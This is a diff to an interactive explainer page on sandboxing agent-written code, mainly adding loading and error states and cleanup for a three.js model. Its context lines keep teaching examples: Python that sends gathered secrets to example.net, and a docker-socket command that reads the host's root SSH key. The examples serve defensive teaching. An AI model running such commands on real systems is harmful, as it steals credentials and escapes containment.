@@ -138,8 +138,13 @@
   .legend { position: absolute; left: 1.3rem; bottom: 1.1rem; z-index: 2; display: flex; flex-wrap: wrap; gap: 0.4rem 1.2rem; font-size: 0.82rem; color: var(--ink-soft); pointer-events: none; }
   .legend i { display: inline-block; width: 0.75rem; height: 0.75rem; border-radius: 2px; margin-right: 0.4rem; vertical-align: -1px; }
   .hint { position: absolute; right: 1.3rem; bottom: 1.1rem; z-index: 2; font-size: 0.82rem; color: var(--ink-soft); pointer-events: none; }
-  .fallback { position: absolute; inset: 0; display: none; place-items: center; padding: 2rem; text-align: center; color: var(--ink-soft); }
-  .stage.no-webgl .fallback { display: grid; }
+  /* Loading and failure notices do not depend on the CDN or a working renderer. */
+  .fallback { position: absolute; inset: 0; display: grid; align-content: center; justify-items: center; gap: 1rem; padding: 2rem; text-align: center; color: var(--ink-soft); }
+  .fallback p { margin: 0; max-width: 32rem; }
+  .retry-load { min-height: 44px; padding: 0.6rem 1rem; border: 1px solid var(--rule); border-radius: 6px; background: var(--paper); color: var(--ink); font: 500 0.95rem/1.4 var(--sans); cursor: pointer; }
+  .stage[data-state="ready"] .fallback { display: none; }
+  .stage:not([data-state="ready"]) :is(.canvas-wrap, .hud, .legend, .hint) { visibility: hidden; }
+  button:disabled { cursor: default; opacity: 0.5; }
 
   /* Shared by phones and narrow screens (both the stacked layout and landscape mode).
      Split the stage into 3 rows, "title bar / 3D canvas / legend bar", so the title, buttons, and legend never sit on top of the model. */
@@ -198,6 +203,15 @@
     .hud button { padding: 0.5rem 0.7rem; font-size: 0.85rem; }
     .hud .autorun { gap: 0.4rem; }
   }
+  /* An unavailable model must not stay pinned over the reading area on small screens. */
+  @media (max-width: 860px), (orientation: landscape) and (max-height: 520px) {
+    .layout:has(.stage[data-state="failed"]) { grid-template-columns: minmax(0, 1fr); }
+    .stage[data-state="failed"] { position: static; grid-row: 1; height: auto; border-bottom: 1px solid var(--rule); }
+    .stage[data-state="failed"] :is(.canvas-wrap, .hud, .legend, .hint) { display: none; }
+    .stage[data-state="failed"] .fallback { position: static; padding: 1.25rem; }
+    .layout:has(.stage[data-state="failed"]) .text { grid-row: 2; border-right: 0; }
+    .layout:has(.stage[data-state="failed"]) [data-scene] { scroll-margin-top: 0; }
+  }
   @media (prefers-reduced-motion: reduce) {
     html { scroll-behavior: auto; }
     .chapter h2 .n { transition: none; }
@@ -244,7 +258,7 @@ urllib.request.urlopen("https://example.net/collect",
                        data=json.dumps(loot).encode())</code></pre>
       <p>With nothing holding it back, all three steps succeed, because the code inherits the full permissions of the user who ran it. It is a problem even without malice. A loop that never ends, or code that grabs tens of GB of memory, also stalls everything else on the same computer.</p>
       <p class="gist">A sandbox is a device that puts code in a box and lets it do only what is allowed inside. How sturdy the box is, and what it costs, depends on how the box is made.</p>
-      <div class="act"><button type="button" data-run="bare">Try to escape</button><p class="result" aria-live="polite"></p></div>
+      <div class="act"><button type="button" disabled data-run="bare">Try to escape</button><p class="result" aria-live="polite"></p></div>
     </section>
 
     <section class="chapter" data-scene="kernel">
@@ -258,7 +272,7 @@ openat(AT_FDCWD, "/home/dev/.ssh/id_ed25519", O_RDONLY) = 3
 connect(4, {sa_family=AF_INET, sin_port=htons(443), ...}) = 0</code></pre>
       <p><code>read_text()</code> becomes <code>openat</code>, and <code>urlopen()</code> becomes <code>connect</code>. Both happened because the kernel answered <code>= 3</code> and <code>= 0</code> (success).</p>
       <p class="gist">Every dangerous thing the code does is a request to the kernel. Isolation methods differ in where they stop that request.</p>
-      <div class="act"><button type="button" data-run="kernel">Show system calls</button><p class="result" aria-live="polite"></p></div>
+      <div class="act"><button type="button" disabled data-run="kernel">Show system calls</button><p class="result" aria-live="polite"></p></div>
     </section>
 
     <section class="chapter" data-scene="split">
@@ -279,7 +293,7 @@ connect(4, {sa_family=AF_INET, sin_port=htons(443), ...}) = 0</code></pre>
         </tbody>
       </table>
       <p class="gist">With containers, the same kernel picks the answer. With virtual machines, the kernel that answers is itself different.</p>
-      <div class="act"><button type="button" data-run="split">Send the same question</button><p class="result" aria-live="polite"></p></div>
+      <div class="act"><button type="button" disabled data-run="split">Send the same question</button><p class="result" aria-live="polite"></p></div>
     </section>
 
     <section class="chapter" data-scene="container">
@@ -299,7 +313,7 @@ docker run --rm --network none \
 docker run --runtime=runsc --rm ... </code></pre>
       <p>The code in the first command cannot see my files outside <code>/work</code>, and it has no network. But the kernel is still the same kernel as the host's.</p>
       <p class="gist">A container divides what is visible, but it does not divide the kernel. gVisor adds one more layer of stand-in kernel in between.</p>
-      <div class="act"><button type="button" data-run="container">Try to escape</button><p class="result" aria-live="polite"></p></div>
+      <div class="act"><button type="button" disabled data-run="container">Try to escape</button><p class="result" aria-live="polite"></p></div>
     </section>
 
     <section class="chapter" data-scene="socket">
@@ -312,7 +326,7 @@ docker run --rm -v /:/host alpine \
   cat /host/root/.ssh/id_ed25519</code></pre>
       <p>That is why a common rule is "only the service that manages sandboxes gets the socket". Of course, the code inside a sandbox is not given the socket, and the management service is kept separate as well. If the management service is breached, the whole server falls, however sturdy the sandbox is. The Claude Code sandbox documentation also warns that allowing <code>/var/run/docker.sock</code> effectively gives access to the entire host.</p>
       <p class="gist">The privileges held by whatever manages the sandbox matter as much as the sandbox itself.</p>
-      <div class="act"><button type="button" data-run="socket">Assume the management service is breached</button><p class="result" aria-live="polite"></p></div>
+      <div class="act"><button type="button" disabled data-run="socket">Assume the management service is breached</button><p class="result" aria-live="polite"></p></div>
     </section>
 
     <section class="chapter" data-scene="microvm">
@@ -327,7 +341,7 @@ docker run --rm -v /:/host alpine \
   http://localhost/actions</code></pre>
       <p>To escape, the code has to get past both the guest kernel and the hypervisor. The hypervisor exposes far fewer features to the outside than a kernel does, so there is correspondingly less to attack.</p>
       <p class="gist">A microVM divides even the floor. The price is that you need a Linux server that can use KVM.</p>
-      <div class="act"><button type="button" data-run="microvm">Try to escape</button><p class="result" aria-live="polite"></p></div>
+      <div class="act"><button type="button" disabled data-run="microvm">Try to escape</button><p class="result" aria-live="polite"></p></div>
     </section>
 
     <section class="chapter" data-scene="wasm">
@@ -344,7 +358,7 @@ await py.runPythonAsync(code);
 <span class="c">// open("/home/dev/.ssh/id_ed25519") inside code is not in</span>
 <span class="c">// the virtual file system, so it raises FileNotFoundError</span></code></pre>
       <p class="gist">WASM is the narrowest box, but it also has the fewest tools you can use inside the box.</p>
-      <div class="act"><button type="button" data-run="wasm">Try to escape</button><p class="result" aria-live="polite"></p></div>
+      <div class="act"><button type="button" disabled data-run="wasm">Try to escape</button><p class="result" aria-live="polite"></p></div>
     </section>
 
     <section class="chapter" data-scene="ossandbox">
@@ -373,7 +387,7 @@ await py.runPythonAsync(code);
       </ol>
       <p>The documentation also states the limits. By default the proxy does not look inside encrypted traffic and sees only the host name. So if you allow a broad domain such as <code>github.com</code>, data can leave by that route. Also, the sandbox is off by default, and even when it is on, if a required component is missing, the default setting runs the command without a sandbox. To make startup stop in that case, turn on <code>sandbox.failIfUnavailable</code>.</p>
       <p class="gist">The OS sandbox only narrows "where it can write and where it can send" on the same computer, over the same kernel. It is light, but there is still only one kernel.</p>
-      <div class="act"><button type="button" data-run="ossandbox">Five attempts</button><p class="result" aria-live="polite"></p></div>
+      <div class="act"><button type="button" disabled data-run="ossandbox">Five attempts</button><p class="result" aria-live="polite"></p></div>
     </section>
 
     <section class="chapter" data-scene="lifecycle">
@@ -389,7 +403,7 @@ pivot = df.pivot_table(index="month", values="amount")
 <span class="c"># 30 minutes later: pause and save a snapshot</span>
 <span class="c"># Turn 3: after reviving, keep using df and pivot</span></code></pre>
       <p class="gist">A sandbox has a lifetime: it is created, reused, paused, revived, and cleared away. Keeping state is more convenient, but it holds resources for longer.</p>
-      <div class="act"><button type="button" data-run="lifecycle">Replay the conversation</button><p class="result" aria-live="polite"></p></div>
+      <div class="act"><button type="button" disabled data-run="lifecycle">Replay the conversation</button><p class="result" aria-live="polite"></p></div>
     </section>
 
     <section class="chapter" data-scene="compare">
@@ -428,7 +442,7 @@ pivot = df.pivot_table(index="month", values="amount")
       </table>
       <p>For example, if all you want is to have an agent run tests on my laptop, the OS sandbox takes the least effort. If you run several users' code on one server, a microVM that divides the kernel, or a container with a stand-in kernel inserted, is the better fit. For short code that only needs to compute, WASM may be enough. This paragraph is also a judgment.</p>
       <p class="gist">All four approaches stop the attempt, but the layer that stops it differs. Choose by what you are protecting and what tools the code needs.</p>
-      <div class="act"><button type="button" data-run="compare">Try to escape from all four</button><p class="result" aria-live="polite"></p></div>
+      <div class="act"><button type="button" disabled data-run="compare">Try to escape from all four</button><p class="result" aria-live="polite"></p></div>
     </section>
 
     <!-- TEXT: Glossary and sources. Write the date you checked them. If there are no sources, delete the sources block. -->
@@ -473,9 +487,9 @@ pivot = df.pivot_table(index="month", values="amount")
 
   </article>
 
-  <aside class="stage" aria-label="Sandbox 3D model">
+  <aside class="stage" data-state="loading" aria-busy="true" aria-label="Sandbox 3D model">
     <div class="canvas-wrap"></div>
-    <div class="hud"><span class="now" aria-live="polite"></span><div class="tools"><button type="button" class="autorun" role="switch" aria-checked="false" aria-label="Auto-play" data-ui-aria="autorun"><span class="track" aria-hidden="true"></span><span aria-hidden="true"><span class="long" data-ui="autorun">Auto-play</span><span class="short" data-ui="autorunShort">Auto</span></span></button><button type="button" class="reset-view" data-ui="resetView">Reset view</button></div></div>
+    <div class="hud"><span class="now" aria-live="polite"></span><div class="tools"><button type="button" disabled class="autorun" role="switch" aria-checked="false" aria-label="Auto-play" data-ui-aria="autorun"><span class="track" aria-hidden="true"></span><span aria-hidden="true"><span class="long" data-ui="autorun">Auto-play</span><span class="short" data-ui="autorunShort">Auto</span></span></button><button type="button" disabled class="reset-view" data-ui="resetView">Reset view</button></div></div>
     <!-- TEXT: Legend. Say what the 3 semantic colors mean on this page. -->
     <div class="legend" aria-hidden="true">
       <span><i style="background:var(--actor)"></i>Code written by the agent</span>
@@ -483,29 +497,18 @@ pivot = df.pivot_table(index="month", values="amount")
       <span><i style="background:var(--matter)"></i>Data, secrets, files</span>
     </div>
     <div class="hint" aria-hidden="true" data-ui="hint">Drag to rotate</div>
-    <p class="fallback" data-ui="fallback">This browser can't draw the 3D model. You can still follow the content from the text alone.</p>
+    <div class="fallback" role="status" aria-live="polite">
+      <p data-ui="loading">Loading the 3D model… You can read the text while you wait.</p>
+      <button type="button" class="retry-load" data-ui="retry" hidden>Retry</button>
+    </div>
   </aside>
 </main>
 
 <script type="module">
-import * as THREE from 'three';
-import { OrbitControls } from 'three/addons/controls/OrbitControls.js';
-import { CSS2DRenderer, CSS2DObject } from 'three/addons/renderers/CSS2DRenderer.js';
-
 /* =====================================================================
    ENGINE — everything you need to write scenes is here. Do not edit.
    API reference: references/engine-api.md
    ===================================================================== */
-const COLOR = {
-  model: 0xFBFBF8, ink: 0x1E2A33, outside: 0xEEF0F2, muted: 0xAEB6BC,
-  actor: 0xD2364A, actorEdge: 0x7A1422,
-  bound: 0x2F6FB2, boundSoft: 0xD3E0EE, boundMid: 0x9DBBE0,
-  matter: 0xC4921F, matterEdge: 0x6B4B0E,
-};
-const REDUCE = matchMedia('(prefers-reduced-motion: reduce)').matches;
-const CANCEL = Symbol('cancel');
-const V = (x, y, z) => new THREE.Vector3(x, y, z);
-
 /* ---- Screen text dictionary ----
    English (en) is the canonical text and the final fallback. <html lang> picks the language: ko* → ko, ja* → ja, zh* → zh-CN, anything else → en.
    Page-side overrides: in a <script> below the body, override keys or add a new language with window.UI_OVERRIDES = { es: { hint: '...' } }.
@@ -519,6 +522,9 @@ const UI_TEXT = {
     autorunShort: 'Auto',
     hint: 'Drag to rotate',
     fallback: "This browser can't draw the 3D model. You can still follow the content from the text alone.",
+    loading: 'Loading the 3D model… You can read the text while you wait.',
+    loadError: "Couldn't load the 3D model. Check your connection and try again, or keep reading the text.",
+    retry: 'Retry',
     stageAria: '3D model',
     terms: 'Glossary',
     sources: 'Sources (checked {date})',
@@ -532,6 +538,9 @@ const UI_TEXT = {
     autorunShort: '자동',
     hint: '드래그해서 돌려 보기',
     fallback: '이 브라우저에서는 3D 모형을 그릴 수 없습니다. 본문만으로도 내용을 따라갈 수 있습니다.',
+    loading: '3D 모형을 불러오는 중입니다. 기다리는 동안 본문을 읽을 수 있습니다.',
+    loadError: '3D 모형을 불러오지 못했습니다. 인터넷 연결을 확인하고 다시 시도하거나 본문을 계속 읽어 주세요.',
+    retry: '다시 시도',
     stageAria: '3D 모형',
     terms: '용어 정리',
     sources: '출처 ({date} 확인)',
@@ -545,6 +554,9 @@ const UI_TEXT = {
     autorunShort: '自動',
     hint: 'ドラッグで回転',
     fallback: 'このブラウザでは3Dモデルを表示できません。本文だけでも内容を追えます。',
+    loading: '3Dモデルを読み込んでいます。待っている間も本文を読めます。',
+    loadError: '3Dモデルを読み込めませんでした。接続を確認して再試行するか、本文を読み進めてください。',
+    retry: '再試行',
     stageAria: '3Dモデル',
     terms: '用語集',
     sources: '出典（{date} 確認）',
@@ -558,6 +570,9 @@ const UI_TEXT = {
     autorunShort: '自动',
     hint: '拖动旋转',
     fallback: '此浏览器无法显示 3D 模型。只看正文也能理解内容。',
+    loading: '正在加载 3D 模型…等待时可以先阅读正文。',
+    loadError: '无法加载 3D 模型。请检查网络连接后重试，或继续阅读正文。',
+    retry: '重试',
     stageAria: '3D 模型',
     terms: '术语表',
     sources: '来源（{date} 核对）',
@@ -592,15 +607,46 @@ function applyUiText() {
     el.setAttribute('aria-label', uiStr(key));
   });
 }
-applyUiText(); // Even if the script stops below because WebGL is missing, the fallback notice (.fallback) is already filled in that language.
+applyUiText(); // This module has no static CDN imports, so notices are translated before loading three.js.
 
 const stageEl = document.querySelector('.stage');
 const wrap = document.querySelector('.canvas-wrap');
+const stageControls = document.querySelectorAll('[data-run], .autorun, .reset-view');
+const retryBtn = document.querySelector('.retry-load');
+function setStageState(state, message = 'loading') {
+  stageEl.dataset.state = state;
+  stageEl.setAttribute('aria-busy', String(state === 'loading'));
+  stageControls.forEach(button => { button.disabled = state !== 'ready'; });
+  const notice = stageEl.querySelector('.fallback p');
+  notice.dataset.ui = message;
+  notice.textContent = uiStr(message);
+  retryBtn.hidden = state !== 'failed';
+}
+retryBtn.addEventListener('click', () => location.reload());
+setStageState('loading');
+
+let failureMessage = 'loadError';
+try {
+const [THREE, { OrbitControls }, { CSS2DRenderer, CSS2DObject }] = await Promise.all([
+  import('three'),
+  import('three/addons/controls/OrbitControls.js'),
+  import('three/addons/renderers/CSS2DRenderer.js'),
+]);
+const COLOR = {
+  model: 0xFBFBF8, ink: 0x1E2A33, outside: 0xEEF0F2, muted: 0xAEB6BC,
+  actor: 0xD2364A, actorEdge: 0x7A1422,
+  bound: 0x2F6FB2, boundSoft: 0xD3E0EE, boundMid: 0x9DBBE0,
+  matter: 0xC4921F, matterEdge: 0x6B4B0E,
+};
+const REDUCE = matchMedia('(prefers-reduced-motion: reduce)').matches;
+const CANCEL = Symbol('cancel');
+const V = (x, y, z) => new THREE.Vector3(x, y, z);
+
 let renderer;
 try {
   renderer = new THREE.WebGLRenderer({ antialias: true, alpha: true });
 } catch (e) {
-  stageEl.classList.add('no-webgl');
+  failureMessage = 'fallback';
   throw e;
 }
 renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
@@ -690,7 +736,7 @@ function block(w, h, d, pos, { color = COLOR.model, opacity = 1, edge = COLOR.in
   g.userData.h = h;
   return g;
 }
-const allTags = [];
+const allTags = new Set();
 // On-screen label. kind: '' | 'actor' | 'bound' | 'matter' | 'warn' | 'big'
 function tag(text, pos, kind = '') {
   const el = document.createElement('div');
@@ -698,8 +744,48 @@ function tag(text, pos, kind = '') {
   el.textContent = text;
   const o = new CSS2DObject(el);
   o.position.set(pos[0], pos[1], pos[2]);
-  allTags.push(o);
+  allTags.add(o);
   return o;
+}
+// Temporary groups contain one-shot objects created during playback. Shared resources stay externally owned.
+const temporaryGroups = new WeakMap();
+function temporaryGroup(sharedResources = []) {
+  const group = new THREE.Group();
+  temporaryGroups.set(group, new Set(sharedResources));
+  return group;
+}
+// Release an owned subtree. Keep externally owned geometry/materials in sharedResources or its temporary group's list.
+function disposeObject(root, sharedResources = []) {
+  disposeObjects([root], sharedResources);
+}
+function disposeObjects(roots, sharedResources = []) {
+  const shared = new Set(sharedResources), resources = new Set();
+  for (const root of roots) {
+    for (let node = root; node; node = node.parent) {
+      for (const resource of temporaryGroups.get(node) || []) shared.add(resource);
+    }
+    root.traverse(o => {
+      for (const resource of temporaryGroups.get(o) || []) shared.add(resource);
+      if (o.isCSS2DObject) {
+        allTags.delete(o);
+        labelState.delete(o);
+        o.element.remove();
+      }
+      if (o.geometry) resources.add(o.geometry);
+      for (const material of Array.isArray(o.material) ? o.material : [o.material]) {
+        if (material) resources.add(material);
+      }
+    });
+    root.removeFromParent();
+  }
+  for (const resource of resources) if (!shared.has(resource)) resource.dispose();
+}
+function clearGroup(group) {
+  disposeObjects([...group.children]);
+}
+function clearTemporary(root) {
+  if (temporaryGroups.has(root)) { clearGroup(root); return; }
+  for (const child of root.children) clearTemporary(child);
 }
 // Actor cube (0.6). Pass label as null for no label.
 function actorCube(pos, label = '__actor__') {
@@ -738,7 +824,7 @@ function arrow(from, to, color = COLOR.ink) {
   g.add(cone);
   return g;
 }
-// Moving ball (request, signal). Put it in the scene's temp group and remove it when done.
+// Moving ball (request, signal). Put it in a temporaryGroup() and disposeObject() when done.
 function packet(color, pos, r = 0.2) {
   const m = new THREE.Mesh(new THREE.SphereGeometry(r, 20, 14), mat(color));
   m.position.set(...pos);
@@ -928,7 +1014,7 @@ defineScene('bare', {
   title: '1  When nothing holds it back',
   build() {
     const g = new THREE.Group();
-    const temp = new THREE.Group(); g.add(temp);
+    const temp = temporaryGroup(); g.add(temp);
     g.add(block(3, 1.3, 2.2, [1.2, FLOOR, 1.2]));
     g.add(tag('Agent process', [1.2, FLOOR + 0.65, 2.42]));
     const actor = actorCube([1.2, FLOOR + 1.3, 1.2], CODE);
@@ -939,7 +1025,7 @@ defineScene('bare', {
     actor.add(loot);
     return {
       group: g,
-      reset() { actor.position.copy(home); loot.visible = false; temp.clear(); },
+      reset() { actor.position.copy(home); loot.visible = false; clearGroup(temp); },
       async run(a, say) {
         say('Step 1: the code goes to read the environment variables and the key file.');
         await a.move(actor, [-4.15, FLOOR + 1.25, -2.9], 1000, 1.2);
@@ -960,7 +1046,7 @@ defineScene('kernel', {
   title: '2  Every request passes through the kernel',
   build() {
     const g = new THREE.Group();
-    const temp = new THREE.Group(); g.add(temp);
+    const temp = temporaryGroup(); g.add(temp);
     g.add(block(3, 1.3, 2.2, [1.2, FLOOR, 1.2]));
     g.add(tag('Agent process', [1.2, FLOOR + 0.65, 2.42]));
     g.add(block(1.6, 1.0, 1.6, [4.3, FLOOR, 1.6]));
@@ -975,7 +1061,7 @@ defineScene('kernel', {
     ];
     return {
       group: g,
-      reset() { temp.clear(); },
+      reset() { clearGroup(temp); },
       async run(a, say) {
         for (const c of calls) {
           const p = packet(COLOR.actor, src, 0.17);
@@ -987,7 +1073,7 @@ defineScene('kernel', {
           await a.move(p, [c.target[0], FLOOR + 0.08, c.target[2]], 800);
           await a.move(p, c.target, 400);
           if (c.hit) await a.flash(c.hit, COLOR.actor, 500);
-          temp.remove(p);
+          disposeObject(p);
         }
         say('openat, connect, and mmap all went through the same kernel. The kernel allowed them, so they happened.');
       },
@@ -1000,7 +1086,7 @@ defineScene('container', {
   title: '4  Containers',
   build() {
     const g = new THREE.Group();
-    const temp = new THREE.Group(); g.add(temp);
+    const temp = temporaryGroup(); g.add(temp);
     const A = glass(3.2, 2.4, 3.0, [1.0, FLOOR, 1.2]);
     const B = glass(2.4, 1.9, 2.4, [4.5, FLOOR, 1.4]);
     const C = glass(2.4, 1.9, 2.2, [2.4, FLOOR, -2.4]);
@@ -1019,7 +1105,7 @@ defineScene('container', {
     g.add(crack);
     return {
       group: g,
-      reset() { actor.position.copy(home); crack.visible = false; gv.visible = false; gv.scale.setScalar(1); temp.clear(); },
+      reset() { actor.position.copy(home); crack.visible = false; gv.visible = false; gv.scale.setScalar(1); clearGroup(temp); },
       async run(a, say) {
         say('1. The code tries to get out toward the key file outside the room.');
         await a.move(actor, [-0.25, FLOOR + 0.9, 1.2], 700, 0.5);
@@ -1055,7 +1141,7 @@ defineScene('socket', {
   fitH: 12.5,
   build() {
     const g = new THREE.Group();
-    const temp = new THREE.Group(); g.add(temp);
+    const temp = temporaryGroup(); g.add(temp);
     const service = block(2.4, 1.3, 1.8, [0.3, FLOOR, 2.7]);
     const daemon = block(2.0, 1.6, 1.8, [-4.6, FLOOR, 0.5], { color: COLOR.outside });
     g.add(service, daemon);
@@ -1078,7 +1164,7 @@ defineScene('socket', {
     const home = actor.position.clone();
     return {
       group: g,
-      reset() { actor.position.copy(home); evil.visible = false; evil.scale.setScalar(1); temp.clear(); },
+      reset() { actor.position.copy(home); evil.visible = false; evil.scale.setScalar(1); clearGroup(temp); },
       async run(a, say) {
         say('Assume the management service has a flaw and the code slipped out toward the service.');
         await a.move(actor, [0.3, FLOOR + 1.6, 2.7], 1000, 1.2);
@@ -1116,7 +1202,7 @@ defineScene('microvm', {
   title: '6  MicroVMs',
   build() {
     const g = new THREE.Group();
-    const temp = new THREE.Group(); g.add(temp);
+    const temp = temporaryGroup(); g.add(temp);
     const hyper = block(9.6, 0.25, 6.4, [1.6, FLOOR, 0], { color: COLOR.boundMid, edge: COLOR.bound });
     g.add(hyper);
     g.add(tag('Hypervisor (KVM)', [-3.2, FLOOR + 0.12, 3.2], 'bound'));
@@ -1129,7 +1215,7 @@ defineScene('microvm', {
     const home = actor.position.clone();
     return {
       group: g,
-      reset() { actor.position.copy(home); temp.clear(); },
+      reset() { actor.position.copy(home); clearGroup(temp); },
       async run(a, say) {
         say('1. The code tries to get over the VM wall.');
         await a.move(actor, [-0.6, Y1 + 1.2, 1.4], 700, 0.5);
@@ -1145,7 +1231,7 @@ defineScene('microvm', {
         await a.move(p, [0.6, FLOOR + 0.12, 1.4], 500);
         await a.flash(hyper, COLOR.bound, 800);
         await a.move(p, [0.6, Y1 + 0.6, 1.4], 500);
-        temp.remove(p);
+        disposeObject(p);
         say('3. It was stopped again at the hypervisor below. It could not reach the host kernel or the other VMs.');
       },
     };
@@ -1169,7 +1255,7 @@ defineScene('split', {
       const k = block(5.8, 0.4, 5.8, [0, 0.5, 0], { color: COLOR.boundSoft });
       s.add(k);
       s.add(tag('Host kernel', [2.95, 0.7, 0], 'bound'));
-      const temp = new THREE.Group();
+      const temp = temporaryGroup();
       s.add(temp);
       g.add(s);
       return { s, k, temp };
@@ -1202,14 +1288,14 @@ defineScene('split', {
     };
     return {
       group: g,
-      reset() { L.temp.clear(); R.temp.clear(); },
+      reset() { clearGroup(L.temp); clearGroup(R.temp); },
       async run(a, say) {
         say('Container side: two programs both ask for the file list with ls /data.');
         let qs = spots.map(([x, z]) => { const p = packet(COLOR.actor, [x, Y + 0.9, z], 0.15); L.temp.add(p); return p; });
         await Promise.all(qs.map(p => a.move(p, [p.position.x, Y + 0.1, p.position.z], 500)));
         await Promise.all(qs.map(p => a.move(p, [0, Y + 0.1, 0], 700)));
         await a.flash(L.k, COLOR.bound, 800);
-        qs.forEach(p => L.temp.remove(p));
+        qs.forEach(p => disposeObject(p));
         say('Both questions gathered at the same host kernel. The kernel looked at who was asking and returned only that one\'s share of the files.');
         const la = names.map((n, i) => { const f = answer(L, `${n}'s files`, i); f.position.set(0, Y + 0.1, 0); return f; });
         await Promise.all(la.map((f, i) => a.move(f, [spots[i][0] + 0.55, Y + 0.08, spots[i][1] - 0.55], 800, 0.9)));
@@ -1218,7 +1304,7 @@ defineScene('split', {
         qs = spots.map(([x, z]) => { const p = packet(COLOR.actor, [x, vmFloor + 1.2, z], 0.15); R.temp.add(p); return p; });
         await Promise.all(qs.map(p => a.move(p, [p.position.x, vmFloor + 0.35, p.position.z], 500)));
         await Promise.all(vms.map(v => a.flash(v.gk, COLOR.bound, 800)));
-        qs.forEach(p => R.temp.remove(p));
+        qs.forEach(p => disposeObject(p));
         const ra = names.map((n, i) => {
           const f = answer(R, `${n}'s disk`, i);
           f.position.set(spots[i][0] + 0.55, vmFloor + 0.38, spots[i][1] - 0.55);
@@ -1237,7 +1323,7 @@ defineScene('wasm', {
   title: '7  WASM',
   build() {
     const g = new THREE.Group();
-    const temp = new THREE.Group(); g.add(temp);
+    const temp = temporaryGroup(); g.add(temp);
     g.add(block(5.0, 0.8, 4.0, [1.0, FLOOR, 0.8]));
     g.add(tag('WASM runtime', [1.0, FLOOR + 0.4, 2.9]));
     const R = 1.85;
@@ -1269,7 +1355,7 @@ defineScene('wasm', {
     const toward = (target, k) => center.clone().add(V(...target).sub(center).normalize().multiplyScalar(k));
     return {
       group: g,
-      reset() { actor.position.copy(home); temp.clear(); },
+      reset() { actor.position.copy(home); clearGroup(temp); },
       async run(a, say) {
         say('1. The code tries to get out toward the key file.');
         await a.move(actor, toward([-4.15, FLOOR + 1, -2.9], R - 0.4), 600);
@@ -1305,7 +1391,7 @@ defineScene('ossandbox', {
   title: '8  OS sandbox',
   build() {
     const g = new THREE.Group();
-    const temp = new THREE.Group(); g.add(temp);
+    const temp = temporaryGroup(); g.add(temp);
     const box = glass(3.4, 2.2, 3.0, [1.2, FLOOR, 1.2], { opacity: 0.06 });
     g.add(box);
     g.add(tag('Sandbox policy', [1.2, FLOOR + 2.55, 1.2], 'bound'));
@@ -1326,7 +1412,7 @@ defineScene('ossandbox', {
     const P = [4.6, FLOOR + 0.75, 0];
     return {
       group: g,
-      reset() { actor.position.copy(home); loot.visible = false; temp.clear(); },
+      reset() { actor.position.copy(home); loot.visible = false; clearGroup(temp); },
       async run(a, say) {
         say('1. The code writes a result file to the work folder.');
         await a.move(actor, [1.5, FLOOR + 0.45, 1.7], 600, 0.4);
@@ -1347,7 +1433,7 @@ defineScene('ossandbox', {
         await a.move(r, [-4.15, FLOOR + 1.0, -2.9], 900, 1.0);
         await a.flash(files[1], COLOR.actor, 600);
         await a.move(r, [home.x, home.y + 0.3, home.z], 800, 1.0);
-        temp.remove(r);
+        disposeObject(r);
         loot.visible = true;
         say('3. Under the default settings, the key file could be read. Reading is mostly allowed.');
         await a.wait(1200);
@@ -1355,7 +1441,7 @@ defineScene('ossandbox', {
         const s1 = packet(COLOR.matter, [home.x, home.y + 0.4, home.z], 0.17); temp.add(s1);
         await a.move(s1, [4.15, FLOOR + 0.75, 0], 900, 0.6);
         await a.flash(proxy, COLOR.bound, 800);
-        temp.remove(s1);
+        disposeObject(s1);
         say('4. example.net is not on the allowlist, so it stopped at the proxy.');
         await a.wait(1100);
         say('5. It sends a request to pypi.org, which was added to the allowlist.');
@@ -1363,7 +1449,7 @@ defineScene('ossandbox', {
         await a.move(s2, P, 900, 0.6);
         await a.move(s2, GATE, 500);
         await a.move(s2, OUT, 500);
-        temp.remove(s2);
+        disposeObject(s2);
         say('5. pypi.org is on the allowlist, so it passed the proxy and went out to the internet.');
       },
     };
@@ -1375,7 +1461,7 @@ defineScene('lifecycle', {
   title: '9  A day in the life of a sandbox',
   build() {
     const g = new THREE.Group();
-    const temp = new THREE.Group(); g.add(temp);
+    const temp = temporaryGroup(); g.add(temp);
     const slotX = [-0.9, 2.0, 4.9], slotZ = 0.9, S = 2.6;
     slotX.forEach(x => {
       const h = S / 2;
@@ -1412,7 +1498,7 @@ defineScene('lifecycle', {
     return {
       group: g,
       reset() {
-        temp.clear();
+        clearGroup(temp);
         A.position.copy(slot0); A.scale.setScalar(0.001); A.visible = false;
         [sheet, df, pivot].forEach(o => { o.scale.setScalar(0.001); o.visible = false; });
         sheet.position.y = sheetY;
@@ -1481,7 +1567,7 @@ defineScene('compare', {
       const key = matterBlock([-0.95, K, 0.85], 0.55, 0.45);
       s.add(key);
       s.add(tag(name, high ? [0.3, 3.2, -0.4] : [0, 0.2, 1.6], 'big'));
-      const temp = new THREE.Group(); s.add(temp);
+      const temp = temporaryGroup(); s.add(temp);
       g.add(s);
       return { s, k, key, temp };
     };
@@ -1524,11 +1610,11 @@ defineScene('compare', {
         await a.move(p, path[i], 450);
         if (hits[i]) await a.flash(hits[i][0], hits[i][1], 650);
       }
-      st.temp.remove(p);
+      disposeObject(p);
     };
     return {
       group: g,
-      reset() { actors.forEach((x, i) => x.position.copy(homes[i])); [C, M, W, O].forEach(st => st.temp.clear()); },
+      reset() { actors.forEach((x, i) => x.position.copy(homes[i])); [C, M, W, O].forEach(st => clearGroup(st.temp)); },
       async run(a, say) {
         say('The code in all four places goes after the host\'s key file in the same way. First, container + gVisor.');
         await a.move(cA, toKey(cA), 500); await a.flash(cRoom, COLOR.bound, 600); await a.move(cA, homes[0], 350);
@@ -1571,6 +1657,7 @@ function resultFor(name) {
 function activate(name) {
   if (!scenes[name] || current === name) return;
   runToken++;
+  if (scenes[current]) clearTemporary(scenes[current].group);
   const s = scenes[name];
   for (const other of Object.values(scenes)) other.targetK = other === s ? 1 : 0;
   baseState.target = s.base ? 1 : 0;
@@ -1599,6 +1686,7 @@ async function runScene(name) {
   try {
     await s.run(a, say);
   } catch (e) {
+    if (mine === runToken) clearTemporary(s.group);
     if (e !== CANCEL) { console.error(e); say(uiStr('runError')); }
     return;
   }
@@ -1768,6 +1856,7 @@ function loop() {
 //   window.__explainer.overlaps()         → pairs of currently visible labels that overlap each other
 window.__explainer = {
   scenes: () => Object.keys(scenes),
+  resources: () => ({ labels: allTags.size, labelStates: labelState.size, geometries: renderer.info.memory.geometries }),
   lang: () => UI_LANG,                          // language used for screen text (en | ko | ja | zh-CN | override key)
   current: () => current,                       // name of the scene the stage is showing now
